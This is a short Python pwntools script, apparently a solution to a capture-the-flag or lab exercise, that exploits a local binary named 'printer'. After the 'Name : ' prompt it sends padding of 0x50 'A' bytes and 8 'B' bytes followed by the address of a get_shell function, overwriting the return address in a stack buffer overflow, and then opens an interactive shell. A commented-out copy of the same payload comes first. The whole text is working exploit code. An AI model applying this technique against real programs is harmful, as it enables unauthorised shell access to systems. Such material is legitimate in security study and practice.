from pwn import *
context.log_level = 'debug'

p = process('./printer')
e = ELF('./printer')

# get_shell = e.symbols['get_shell']

# payload = b'A' * 0x50
# payload += b'B' * 0x8
# payload += p64(get_shell)

# p.sendline(payload)
# p.interactive()

get_shell = e.symbols['get_shell']

payload = b'A' * 0x50
payload += b'B' * 0x8
payload += p64(get_shell)

p.recvuntil('Name : ')

p.sendline(payload)

p.interactive()